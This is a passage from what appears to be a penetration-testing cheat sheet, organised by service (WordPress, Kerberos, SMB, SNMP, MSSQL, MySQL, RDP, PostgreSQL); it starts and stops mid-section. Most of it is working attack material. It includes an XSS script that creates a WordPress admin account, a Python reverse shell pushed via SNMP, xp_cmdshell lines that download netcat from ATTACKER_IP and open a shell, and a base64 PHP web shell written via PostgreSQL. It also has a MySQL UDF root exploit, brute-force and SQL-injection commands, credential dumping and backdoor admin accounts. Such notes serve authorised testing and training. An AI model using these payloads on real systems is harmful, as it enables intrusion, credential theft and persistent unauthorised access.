ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];

// Create new admin account
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=derp&email=derp@derp.com&pass1=herpderp&pass2=herpderp&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```



### 2.6.8 WordPress

```sh
wpscan --update -o wp-scan.txt --url http://$VICTIM_IP/

# --enumerate options:
# p = Popular plugins
# vp = Vulnerable plugins
# ap = All plugins (takes a while)
# t = Popular themes
# vt = Vulnerable themes
# at = All themes (takes a while)
# cb = Config backups
# tt = Timthumbs
# dbe = Db exports
# u = usernames w/ ids 1-10
# m = media IDs 1-10
# NOTE: Value if no argument supplied: --enumerate vp,vt,tt,cb,dbe,u,m

# other useful flags:
# --login-uri URI
#     The URI of the login page if different from /wp-login.php
# --random-user-agent, --rua
#     Be a bit more stealthy
# --update
#     update the WPScan database before scanning

# username / password bruteforce possible
# -U, --usernames LIST
#     LIST of usernames and/or files w/ usernames to try. e.g. admin,users.txt
#     Will auto-enum users if -U not supplied
# -P, --passwords FILE-PATH
#     path to password file for brute force

# aggressive scan:
wpscan --update \
       --random-user-agent \
       --enumerate ap,at,cb,dbe,u \
       --detection-mode aggressive \
       --plugins-detection aggressive \
       --plugins-version-detection aggressive \
       --url http://$VICTIM_IP/

# scan with cmsmap (https://github.com/Dionach/CMSmap):
cmsmap -o cmsmap.txt -d http://$VICTIM_IP
```

Also try logging into the Wordpress admin page (`/wp-admin`).

If you can log in, you can update the page template to get code execution. Appearance → Editor → 404 Template (at the right), add a PHP shell.

After admin portal login, also try plugin upload to add a web shell/known vulnerable plugin. Remember to activate plugin after install.

[WordPress Plugin Webshell](https://github.com/p0dalirius/Wordpress-webshell-plugin) - accessible via `/wp-content/plugins/wp_webshell/wp_webshell.php?action=exec&cmd=id`

Maybe upload Media file that has PHP script?

Post exploit: The `wp-config.php` file contains information required by WordPress to connect to the database (credentials).

```bash
# Extract usernames and passwords:
mysql -u USERNAME --password=PASSWORD -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```

Check [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress) for more.


### 2.6.9 Drupal

```sh
droopescan scan drupal http://$VICTIM_IP -t 32 # if drupal found
```



### 2.6.10 Joomla

```sh
joomscan --ec -u $VICTIM_IP # if joomla found
```



## 2.7 Kerberos - 88,749

```sh
# username enumeration with Kerbrute
./kerbrute userenum --dc DC_IP -d DOMAINNAME userlist.txt

# dump all LDAP users
impacket-GetADUsers -all -no-pass -dc-ip DC_IP DOMAIN.tld/
impacket-GetADUsers -all -dc-ip DC_IP DOMAIN.tld/user:password

# ASREPRoasting - Kerberos attack that allows password hashes to be retrieved
# for users that do not require pre-authentication (user has “Do not use
# Kerberos pre-authentication” enabled).
# Find ASREPRoastable users and password hashes (slash after domain required)
impacket-GetNPUsers -dc-ip DC_IP -usersfile found-users.txt DOMAIN.tld/
# be sure to crack the hashes to retrieve the passwords
hashcat -m 18200 /path/to/hashfile.txt /usr/share/wordlists/rockyou.txt --force

# alternate method (done locally on windows box):
# uses: https://github.com/GhostPack/Rubeus
Rubeus.exe asreproast /format:john /outfile:hash.txt

# list SMB shares with hash of asreproasted user
smbclient '\\VICTIM_IP\sharename' -L DC_IP -W DOMAIN -U username%NTHASH --pw-nt-hash
```



## 2.8 POP - 110,995

Post Office Protocol (POP) retrieves email from a remote mail server.

```sh
# banner grabbing
nc -nvC $VICTIM_IP 110
openssl s_client -connect $VICTIM_IP:995 -crlf -quiet

# basic scan
nmap -n -v -p110 -sV --script="pop3-* and safe" -oA nmap/pop3 $VICTIM_IP

# Bruteforcing
hydra -V -f -l USERNAME -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt $VICTIM_IP pop3
hydra -V -f -S -l USERNAME -P /path/to/passwords.txt -s 995 $VICTIM_IP pop3

# user enum / log in
nc -nvC $VICTIM_IP 110  # "-C" for \r\n line endings, required
telnet $VICTIM_IP 110   # alternate method
USER username
PASS password
LIST # gets list of emails and sizes
RETR 1 # retrieve first email
# try real (root) and fake users to see if there is a difference in error msgs
```



## 2.9 RPCbind - 111

Gets you list of ports open using RPC services. Can be used to locate NFS
or rusersd services to pentest next.

```sh
# banner grab
nc -nv $VICTIM_IP 111

# list short summary of rpc services
rpcinfo -s $VICTIM_IP
# list ports of rpc services
rpcinfo -p $VICTIM_IP

# try connecting with null session
rpcclient -U "" $VICTIM_IP
rpcclient $> enumdomusers
rpcclient $> queryuser 0xrid_ID
# see MSRPC (port 135) for more commands
```



## 2.10 NNTP - 119

Network News Transfer Protocol, allows clients to retrieve (read) and post
(write) news articles to the NNTP (Usenet) server.

```sh
# banner grab, interact/view articles
nc -nvC $VICTIM_IP 119   # "-C" required for \r\n line endings
HELP  # list help on commands (not always available)
LIST  # list newsgroups, with 1st and last article numbers in each group
GROUP newsgroup.name  # select the desired newsgroup to access (e.g. "net.news")
LAST  # view last article in newsgroup
ARTICLE msgID   # view article by ID
NEXT  # go to next article
QUIT
# http://www.tcpipguide.com/free/t_NNTPCommands-2.htm
# https://tools.ietf.org/html/rfc977
```



## 2.11 MSRPC and NetBIOS - 135,137,139

Port 135 is MSRPC. Port 139 is NetBIOS (legacy: 137, 138?), which is tied to SMB for backwards compatibility of session management and name services.

```sh
# see the services available through MSRPC
impacket-rpcdump $VICTIM_IP | tee rpcdump.log
# lsa/samr ones let you enumerate users

# interact with MSRPC
# via null session:
rpcclient $VICTIM_IP -U "" -N
# authenticated:
rpcclient $VICTIM_IP -W DOMAIN -U username -P password
# from here can enumerate users, groups, etc.
# (netshareenum, lookupnames, lookupsids, enumdomusers, ...)
srvinfo           # query server info
querydispinfo     # list users
enumdomusers      # list users
enumdomgroups     # list groups
enumdomains       # list domains
querydominfo      # domain info
lsaquery          # get SIDs
lsaenumsid        # get SIDs
lookupsids <sid>  # lookup SID
```

Users enumeration

- **List users**: `querydispinfo` and `enumdomusers`
- **Get user details**: `queryuser <0xrid>`
- **Get user groups**: `queryusergroups <0xrid>`
- **GET SID of a user**: `lookupnames <username>`
- **Get users aliases**: `queryuseraliases [builtin|domain] <sid>`

Groups enumeration

- **List groups**: `enumdomgroups`
- **Get group details**: `querygroup <0xrid>`
- **Get group members**: `querygroupmem <0xrid>`

Aliasgroups enumeration

- **List alias**: `enumalsgroups <builtin|domain>`
- **Get members**: `queryaliasmem builtin|domain <0xrid>`

Domains enumeration

- **List domains**: `enumdomains`
- **Get SID**: `lsaquery`
- **Domain info**: `querydominfo`

More SIDs

- **Find SIDs by name**: `lookupnames <username>`
- **Find more SIDs**: `lsaenumsid`
- **RID cycling (check more SIDs)**: `lookupsids <sid>`

```bash
# dump user information
# can also add creds: [[domain/]username[:password]@]<VictimIP>
impacket-samrdump -port 139 $VICTIM_IP
```



## 2.12 SMB - 445

Port 445 is Server Message Block (SMB).

Use `enum4linux` or `smbmap` to gather tons of basic info (users, groups, shares, etc.)

Definitely look at [HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-smb)

SMB Scans:

```sh
# get netbios names of computers, and usernames
crackmapexec smb VICTIM_IP/24
sudo nbtscan -r $VICTIM_IP/24 # force port 137, which Win95 hosts need to respond
nbtscan $VICTIM_IP/24

# check null sessions
crackmapexec smb VICTIM_IP/24 -u '' -p ''

# check guest login
crackmapexec smb VICTIM_IP/24 -u 'guest' -p ''

# enumerate hosts with SMB signing not required
crackmapexec smb VICTIM_IP/24 --gen-relay-list ntlm-relayers.txt

# list shares
smbmap -H $VICTIM_IP
# try with '-u guest' if getting "[!] Authentication error"
# try with '-u null -p null'

# list (only) windows version
smbmap -vH $VICTIM_IP

# recursively list directory contents
smbmap -R -H $VICTIM_IP

# basic scan, enum4linux
enum4linux $VICTIM_IP

# scan all the things
enum4linux -aMld $VICTIM_IP | tee enum4linux.log
# try with guest user if getting nothing via null session:
enum4linux -u guest -aMld $VICTIM_IP | tee enum4linux.log
# may need workgroup: '-w' (smbmap can get it when enum4linux doesn't)

# nmap script scans
nmap --script="safe and smb-*" -n -v -p 139,445 $VICTIM_IP
```

Listing SMB Shares:

```bash
# enumerate readable/writable shares on multiple IPs with/without credentials
crackmapexec smb VICTIM_IPS -u USERNAME -p 'PASSWORD' --shares --filter-shares READ WRITE

# list available shares using smbmap (no creds)
smbmap -H $VICTIM_IP

# List shares using smbclient (no creds)
smbclient -N -L $VICTIM_IP

# Enumerate shares you have creds for
# Can provide password after '%' with smbclient;
# will prompt for password if omitted.
smbclient -L $VICTIM_IP -W DOMAIN -U 'username[%password]'

# Use  -c 'recurse;ls'  to list dirs recursively with smbclient
# With --pw-nt-hash, the password is provided in NT hash form
smbclient -U 'username%NTHASH' --pw-nt-hash -c 'recurse;ls' //$VICTIM_IP

# List with smbmap, without SHARENAME it lists everything
smbmap [-u "username" -p "password"] -R [SHARENAME] -H <IP> [-P <PORT>] # Recursive list
smbmap [-u "username" -p "password"] -r [SHARENAME] -H <IP> [-P <PORT>] # Non-Recursive list
smbmap -u "username" -p "<LM>:<NT>" [-r/-R] [SHARENAME] -H <IP> [-P <PORT>] # Pass-the-Hash
```

Listing SMB Shares from Windows:

```powershell
# view shares on local host
net share

# /all lets us see administrative shares (ending in '$').
# Can use IP or hostname to specify host.
net view \\VICTIM /all
```

Common shares for Windows:

- C$ - maps to C:/
- ADMIN$ - maps to C:/Windows
- IPC$ - used for RPC
- Print$ - hosts drivers for shared printers
- SYSVOL - only on DCs
- NETLOGON - only on DCs

**NOTE:** In recent versions of Kali, when connecting with `smbclient`, you might see an error message like:

```
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
```

This is due to the fact that NTLMv1 (insecure) protocol was disabled by default. You can turn it back on by adding the following settings under `GLOBAL` in `/etc/samba/smb.conf`

```
client min protocol = CORE
client max protocol = SMB3
```

Or you can add the flags `-m SMB2` or `-m SMB3` to your invocation of `smbclient` on the command line. However, this 2nd method does not apply to other tools like `enum4linux`

### 2.12.1 SMB Credential Bruteforcing

```sh
nmap --script smb-brute -p 445 $VICTIM_IP
hydra -V -f -l Administrator -P passwords.txt -t 1 $VICTIM_IP smb
```

### 2.12.2 Interacting with SMB

```sh
# tar all files [under a directory (no trailing slash on path)]
smbclient //10.10.10.123/SHARENAME -N -Tc smbfiles.tar [/PATH/TO/DIR]

# recursively get all files (interactive session)
smbclient //$VICTIM_IP/SHARENAME
> mask "" # don't filter any file names
> recurse on # recursively execute commands
> prompt off # don't prompt for file names
> mget * # copy all files matching mask to host

# Interactive smb shell with creds
smbclient '\\VICTIM_IP\sharename' -W DOMAIN -U username[%password]
# add --pw-nt-hash to tell it to interpret password as NT hash (don't include LM portion)
smbclient '\\VICTIM_IP\sharename' -W DOMAIN -U username%NTHASH --pw-nt-hash

smb:\> help  # displays commands to use
smb:\> ls  # list files
smb:\> get filename.txt  # fetch a file

# mount smb share
mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share

# try executing a command using wmi (can try psexec by adding '--mode psexec')
smbmap -x 'ipconfig' $VICTIM_IP -u USER -p PASSWORD
```



## 2.13 SNMP(s) - 161,162,10161,10162

Simple Network Management Protocol (SNMP), runs on UDP 161 and 162 (trap). The secure version (using TLS) is on 10161 and 10162.

Before getting started, install the MIBs:

```sh
sudo apt install -y snmp snmp-mibs-downloader
sudo download-mibs
```

For resolving further issues with MIBs, see [Using and loading MIBs](https://net-snmp.sourceforge.io/wiki/index.php/TUT:Using_and_loading_MIBS)

Basic SNMP enumeration:

```sh
# nmap snmp scan
nmap --script "snmp* and not snmp-brute" $VICTIM_IP

# quick bruteforce snmp community strings with onesixtyone
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt $VICTIM_IP -w 100

# extended bruteforce snmp community strings with hydra
hydra -P /usr/share/seclists/Discovery/SNMP/snmp.txt -v $VICTIM_IP snmp

# comprehensive enumeration (system/network/process/software info)
snmp-check $VICTIM_IP

# basic enumeration with onesixtyone, using default 'public' community string
onesixtyone $VICTIM_IP public

# getting system description (like uname -a on Linux systems)
snmpwalk -v2c -c public $VICTIM_IP SNMPv2-MIB::sysDescr
snmpget -v2c -c public $VICTIM_IP SNMPv2-MIB::sysDescr.0

snmpwalk -c public -v2c $VICTIM_IP 1.3.6.1.4.1.77.1.2.25 # users
snmpwalk -c public -v2c $VICTIM_IP 1.3.6.1.2.1.25.4.2.1.2 # processes
snmpwalk -c public -v2c $VICTIM_IP 1.3.6.1.2.1.6.13.1.3 # ports
snmpwalk -c public -v2c $VICTIM_IP 1.3.6.1.2.1.25.6.3.1.2 # software
snmpwalk -c public -v2c $VICTIM_IP HOST-RESOURCES-MIB::hrSWInstalledName # software

# get ALL info available on SNMP
snmpwalk -v2c -c public $VICTIM_IP
```

Useful SNMP OIDs:

| OID Value              | Info Provided    |
| ---------------------- | ---------------- |
| 1.3.6.1.2.1.25.1.6.0   | System Processes |
| 1.3.6.1.2.1.25.4.2.1.2 | Running Programs |
| 1.3.6.1.2.1.25.4.2.1.4 | Processes Path   |
| 1.3.6.1.2.1.25.2.3.1.4 | Storage Units    |
| 1.3.6.1.2.1.25.6.3.1.2 | Software Name    |
| 1.3.6.1.4.1.77.1.2.25  | User Accounts    |
| 1.3.6.1.2.1.6.13.1.3   | TCP Local Ports  |

Look [here](https://www.rapid7.com/blog/post/2016/05/05/snmp-data-harvesting-during-penetration-testing/) for some other ideas on getting juicy data from SNMP:

- Email addresses
- SNMP community strings
- Password hashes
- Clear text passwords

Also search for OID info at [http://www.oid-info.com/](http://www.oid-info.com/basic-search.htm)

**SNMP config files:** (may contain sensitive data)

- Typical locations:
  - `/etc/`
  - `/etc/snmp/`
  - `~/.snmp/`
- Common filenames:
  - snmp.conf
  - snmpd.conf
  - snmp-config.xml

### 2.13.1 Exploring MIBs with `snmptranslate`

From the [`snmptranslate` Tutorial](https://net-snmp.sourceforge.io/tutorial/tutorial-5/commands/snmptranslate.html):

```sh
# look up numeric OID to get abbreviated name
snmptranslate .1.3.6.1.2.1.1.3.0
snmptranslate -m +ALL .1.3.6.1.2.1.1.3.0

# look up OID node name without fully-qualified path (random access)
snmptranslate -IR sysUpTime.0

# convert abbreviated OID to numeric (dotted-decimal)
snmptranslate -On SNMPv2-MIB::sysDescr.0

# convert abbreviated OID to dotted-text
snmptranslate -Of SNMPv2-MIB::sysDescr.0
# convert numeric (dotted-decimal) to dotted-text
snmptranslate -m +ALL -Of .1.3.6.1.2.1.1.1.0

# get description/extended info about OID node
snmptranslate -Td SNMPv2-MIB::sysDescr.0
# same for numeric
snmptranslate -m +ALL -Td .1.3.6.1.2.1.1.1.0

# get tree view of subset of MIB tree
snmptranslate -Tp -IR system

# look up OID by regex (best match)
snmptranslate -Ib 'sys.*ime'

#  To get a list of all the nodes that match a given pattern, use the -TB flag:
snmptranslate -TB 'vacm.*table'

# find out what directories are searched for MIBS:
net-snmp-config --default-mibdirs # only if installed
snmptranslate -Dinit_mib .1.3 |& grep MIBDIR
```

When using the `-m +ALL` argument, I got the error:

```
Bad operator (INTEGER): At line 73 in /usr/share/snmp/mibs/ietf/SNMPv2-PDU
```

There is a typo in the file that gets pulled by `snmp-mibs-downloader`. The fix is to replace the existing file with a corrected version, which is located [here](http://pastebin.com/raw/p3QyuXzZ).

### 2.13.2 RCE with SNMP

See [Hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-snmp/snmp-rce)

Easy library to do this: [https://github.com/mxrch/snmp-shell.git](https://github.com/mxrch/snmp-shell.git)

```sh
# manually create reverse shell (update listener IP)
snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private $VICTIM_IP 'nsExtendStatus."derp"' = createAndGo 'nsExtendCommand."derp"' = /usr/bin/env 'nsExtendArgs."derp"' = 'python -c "import sys,socket,os,pty;os.fork() and sys.exit();os.setsid();os.fork() and sys.exit();s=socket.create_connection((\"10.10.14.14\",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")"'

# trigger reverse shell by reading the OID
snmpwalk -v2c -c private $VICTIM_IP NET-SNMP-EXTEND-MIB::nsExtendObjects

# delete the reverse shell command from the SNMP table
snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private $VICTIM_IP 'nsExtendStatus."derp"' = destroy
```

This abuses the NET-SNMP-EXTEND-MIB functionality. See [technical writeup](https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/)



## 2.14 LDAP(s) - 389,636

TODO



## 2.15 MSSQL - 1443

Microsoft SQL Server (MSSQL) is a relational database management system developed by Microsoft. It supports storing and retrieving data across a network (including the Internet).

```sh
# check for known vulns
searchsploit "microsoft sql server"

# if you know nothing about it, try 'sa' user w/o password:
nmap -v -n --script="safe and ms-sql-*" --script-args="mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER" -sV -p 1433 -oA nmap/safe-ms-sql $VICTIM_IP
# if you don't have creds, you can try to guess them, but be careful not to block
# accounts with too many bad guesses
```

See [MSSql Interaction](#4142-mssql-interaction) for how to connect, interact.

**Post-Exploit PrivEsc**

The user running MSSQL server will have the privilege token **SeImpersonatePrivilege** enabled. You will probably be able to escalate to Administrator using this and [JuicyPotato](https://github.com/ohpe/juicy-potato)

### 2.15.1 MSSQL Credential Bruteforcing

```sh
# Be carefull with the number of password in the list, this could lock-out accounts
# Use the NetBIOS name of the machine as domain, if needed
crackmapexec mssql -d DOMAINNAME -u usernames.txt -p passwords.txt $VICTIM_IP
hydra -V -f -L /path/to/usernames.txt –P /path/to/passwords.txt $VICTIM_IP mssql
medusa -h $VICTIM_IP –U /path/to/usernames.txt –P /path/to/passwords.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=usernames.txt,passdb=passwords.txt,ms-sql-brute.brute-windows-accounts $VICTIM_IP
```

More great tips on [HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server)

### 2.15.2 MSSQL Interaction

**Connecting to the MSSQL server**

From kali, for interactive session:

```sh
# simplest tool for interactive MSSQL session
impacket-mssqlclient USERNAME:PASSWORD@VICTIM_IP -windows-auth
# requires double quotes for xp_cmdshell strings

# alternative option, can use single quotes for xp_cmdshell strings
sqsh -S $VICTIM_IP -U 'DOMAIN\USERNAME' -P PASSWORD [-D DATABASE]
```

From Windows:

```bat
sqlcmd -S SERVER -l 30
sqlcmd -S SERVER -U USERNAME -P PASSWORD -l 30
```

**Useful commands:**

```sql
-- show username
select user_name();
select current_user;  -- alternate way

-- show server version
select @@version;

-- get server name
select @@servername;

-- show list of databases ("master." is optional)
select name from master.sys.databases;
exec sp_databases;  -- alternate way
-- note: built-in databases are master, tempdb, model, and msdb
-- you can exclude them to show only user-created databases like so:
select name from master.sys.databases where name not in ('master', 'tempdb', 'model', 'msdb');

-- use database
use master

-- getting table names from a specific database:
select table_name from somedatabase.information_schema.tables;

-- getting column names from a specific table:
select column_name from somedatabase.information_schema.columns where table_name='sometable';

-- get credentials for 'sa' login user:
select name,master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins;

-- get credentials from offsec database (using 'dbo' table schema) user table
select * from offsec.dbo.users;

-- error/boolean-based blind injection
' AND LEN((SELECT TOP 1 username FROM dbo.users))=5; -- #

-- time-based blind injection
' WAITFOR DELAY '0:0:3'; -- #
```

References:
- [PentestMonkey MSSQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
- [PayloadsAllTheThings - MSSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
- [HackTricks - Pentesting MSSQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)

### 2.15.3 MSSQL Command Execution

Simple command execution:

```bash
# Username + Password + CMD command
crackmapexec mssql -d DOMAIN -u USERNAME -p PASSWORD -x "whoami" $VICTIM_IP
# Username + Hash + PS command
crackmapexec mssql -d DOMAIN -u USERNAME -H HASH -X '$PSVersionTable' $VICTIM_IP
```

Using interactive session:

```sql
-- Check if you have server admin rights to enable command execution:
-- Returns 1 if admin
select is_srvrolemember('sysadmin');
go

-- Check if already enabled
-- check if xp_cmdshell is enabled
select convert(int, isnull(value, value_in_use)) as cmdshell_enabled from sys.configurations where name = n'xp_cmdshell';
go

-- turn on advanced options; needed to configure xp_cmdshell
exec sp_configure 'show advanced options', 1;reconfigure;
go

-- enable xp_cmdshell
exec sp_configure 'xp_cmdshell', 1;RECONFIGURE;
go

-- Quickly check what the service account is via xp_cmdshell
EXEC xp_cmdshell 'whoami';
go
-- can be shortened to just: xp_cmdshell 'whoami.exe';
-- long form: EXEC master..xp_cmdshell 'dir *.exe'

-- Bypass blackisted "EXEC xp_cmdshell"
DECLARE @x AS VARCHAR(50)='xp_cmdshell'; EXEC @x 'whoami' —

-- Get netcat reverse shell
xp_cmdshell 'powershell iwr -uri http://ATTACKER_IP/nc.exe -out c:\users\public\nc.exe'
go
xp_cmdshell 'c:\users\public\nc.exe -e cmd ATTACKER_IP 443'
go
```



## 2.16 NFS - 2049

[HackTricks](https://book.hacktricks.xyz/pentesting/nfs-service-pentesting)

```sh
# scan with scripts
nmap -n -v -p 2049 -sV --script="safe and nfs-*" -oA nmap/nfs-scripts $VICTIM_IP

# list all mountpoints
showmount -a $VICTIM_IP
# list all directories
showmount -d $VICTIM_IP
# list all exports (remote folders you can mount)
showmount -e $VICTIM_IP

# the exports are also in /etc/exports
# look for exports with no_root_squash/no_all_squash setting for privesc
# https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe

# Mounting an exported share:
# mount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock
# use version 2 because it doesn't have any authentication or authorization
# if mount fails, try without vers=2
# dir may need "/"prefix
# dir is one of showmount -e results (from /etc/exports)
mkdir nfs && \
sudo mount -t nfs -o rw,nolock,vers=2 $VICTIM_IP:DIR nfs

# create user with specific UID to be able to read files on your kali box
# "-s" login shell, "-M" no create home
sudo useradd -u 1014 -s /usr/sbin/nologin -M tempuser
# removing user when done:
sudo deluser --remove-home tempuser && sudo groupdel tempuser
# or just switch to root to read nearly everything:
sudo su
# if needing a specific group:
sudo groupadd -g 1010 tempgroup
sudo usermod -a -G tempgroup tempuser
```

See also: [6.7. Using NFS for Privilege Escalation](#67-using-nfs-for-privilege-escalation)



## 2.17 MySQL - 3306

MySQL listens on `TCP 3306` by default. You'll see it during a port scan or when running `netstat -tnl`.

Logging in:

```sh
## Locally:
# as root without password (if allowed)
mysql -u root
# same, but prompt for password
mysql -u root -p
# provide password
mysql -u root -p'root'

## Remotely:
mysql -u root -h HOSTNAME
```

Once logged in, check out the schema and environment:

```sql
-- show list of databases
show databases;
-- Set current database to mysql
use mysql;
-- show tables in current database
show tables;
-- describe the table schema for 'user' table
describe user;
select table_name,column_name,table_schema from information_schema.columns where table_schema=database();

-- show MySQL version (both versions work)
select version();
select @@version;
-- show logged-in user
select user();
select system_user();
-- show active database
select database();
show databases;
-- show system architecture
select @@version_compile_os, @@version_compile_machine;
show variables like '%compile%';
-- show plugin directory (for UDF exploit)
select @@plugin_dir;
show variables like 'plugin%';

-- Try to execute code (try all ways)
\! id
select sys_exec('id');
select do_system('id');

-- Try to read files
select load_file('/etc/passwd');
-- more complex method
create table if not exists test (entry TEXT);
load data local infile "/etc/passwd" into table test fields terminated by '\n';
select * from test;
-- show file privileges of 'test' user
select user,file_priv from mysql.user where user='test';
-- show all privs of current user
select * from mysql.user where user = substring_index(user(), '@', 1) ;

-- Look at passwords
-- MySQL 5.6 and below
select host, user, password from mysql.user;
-- MySQL 5.7 and above
select host, user, authentication_string from mysql.user;

-- add new user with full privileges
create user test identified by 'test';
grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to test identified by 'test' WITH GRANT OPTION;
-- show exact privileges
use information_schema; select grantee, table_schema, privilege_type from schema_privileges;
select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user where user='OUTPUT OF select user()';
```

### 2.17.1 MySQL UDF Exploit

Exploiting User-Defined Functions in MySQL to get shell execution. First,
ready the UDF library (provides `sys_exec` function) locally on the server.

Prerequisites:
- Write permission (INSERT) for the database’s "func" table
- FILE privileges to copy our library (shared object) to the plugin directory

```sh
# find sqlmap's copy of lib_mysqludf_sys.so (or dll)
locate lib_mysqludf_sys
# found in /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.so
# copy the file into the server's /tmp/lib_mysqludf_sys.so for examples below
```

In MySQL terminal:

```sql
-- checking permissions
select * from mysql.user where user = substring_index(user(), '@', 1);
-- checking architecture
select @@version_compile_os, @@version_compile_machine;
-- or
show variables like '%compile%';
-- checking plugin directory (where to drop udf library)
select @@plugin_dir;
-- or
show variables like 'plugin%';

-- Linux
use mysql;
create table npn(line blob);
insert into npn values(load_file('/tmp/lib_mysqludf_sys.so'));
select * from npn into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
-- alternative: hex encode .so file and dump it directly:
select binary 0x<shellcode> into dumpfile '<plugin_dir>/lib_mysqludf_sys.so';
create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
select sys_exec('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
-- then start local shell with `/tmp/rootbash -p` to get root

-- Windows
use mysql;
create table npn(line blob);
insert into npn values(load_files('c://temp//lib_mysqludf_sys_32.dll'));
select * from mysql.npn into dumpfile 'c://windows//system32//lib_mysqludf_sys_32.dll';
-- alternative: dump hex shellcode directly into file:
select binary 0x<shellcode> into dumpfile '<plugin_dir>/lib_mysqludf_sys_32.dll';
create function sys_exec returns integer soname 'lib_mysqludf_sys_32.dll';
select sys_exec("net user derp Herpderp1! /add");
select sys_exec("net localgroup administrators derp /add");
```

### 2.17.2 Grabbing MySQL Passwords

```sh
# contains plain-text password of the user debian-sys-maint
cat /etc/mysql/debian.cnf

# contains all the hashes of the MySQL users (same as what's in mysql.user table)
grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
```

### 2.17.3 Useful MySQL Files

- Configuration Files:
  - Windows
    - config.ini
    - my.ini
    - windows\my.ini
    - winnt\my.ini
    - INSTALL_DIR/mysql/data/
  - Unix
    - my.cnf
    - /etc/my.cnf
    - /etc/mysql/my.cnf
    - /var/lib/mysql/my.cnf
    - ~/.my.cnf
    - /etc/my.cnf
- Command History:
  - ~/.mysql.history
- Log Files:
  - connections.log
  - update.log
  - common.log


## 2.18 RDP - 3389

**Connect to Windows RDP**:

```sh
xfreerdp /d:domain /u:username /p:password +clipboard /cert:ignore /size:960x680 /v:$VICTIM_IP
# to attach a drive, use:
# /drive:share,/mnt/vm-share/oscp/labs/public/5-alice/loot

# using pass-the-hash to connect:
# replace /p: with /pth:NTHASH
xfreerdp /u:Administrator /d:SVCORP /pth:63485d30576a1a741106e3e800053b34 /v:$VICTIM_IP
```


**Bruteforce RDP Credentials:**

```sh
# brute force single user's password (watch out for account lockout! check password policy with MSRPC)
hydra -l Administrator -P /usr/share/wordlists/rockyour.txt rdp://VICTIM_IP

# password spray against list of users
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://VICTIM_IP
```


**Add RDP User**: (good for persistence)

```powershell
net user derp herpderp /add
net localgroup Administrators derp /add
net localgroup "Remote Desktop Users" derp /add
# enable remote desktop
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
# delete user
net user hacker /del
# disable remote desktop
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
```



## 2.19 PostgreSQL - 5432

[HackTricks - Pentesting PostgreSQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql)

**Connect:**

```sh
psql -U <myuser> # Open psql console with user (default: postgres)
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

**Interacting/Useful commands:**

**NOTE**: `psql` supports tab completion for table names, db names.

```postgresql
-- List databases
SELECT datname FROM pg_database;
\l
\list

-- List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

\c <database> -- use (connect to) the database
\d -- List tables
\d+ <tablename> -- describe table
-- SQL standard way to describe table:
select column_name, data_type from information_schema.columns where table_name = <tablename>

-- Get current user
Select user;
\du+ -- Get users roles

--Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

-- Get languages
SELECT lanname,lanacl FROM pg_language;

-- Show installed extensions
SHOW rds.extensions;

-- Get history of commands executed
\s

-- Check if current user is superuser 
-- (superuser always has file read/write/execute permissions)
-- 'on' if true, 'off' if false
SELECT current_setting('is_superuser');
```

**Reading text files:**

```postgresql
select string_agg((select * from pg_read_file('/etc/passwd', 0, 1000000)), ' | ')
```

**Writing 1-liner text files:**

```postgresql
-- base64 payload: '<?php system($_GET["cmd"]);?>'
copy (select convert_from(decode('PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4K','base64'),'utf-8')) to '/var/www/html/ws.php'
```

**Code Execution:**

```postgresql
DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Drop the table you want to use if it already exists
CREATE TABLE cmd_exec(cmd_output text); -- Create the table you want to hold the command output
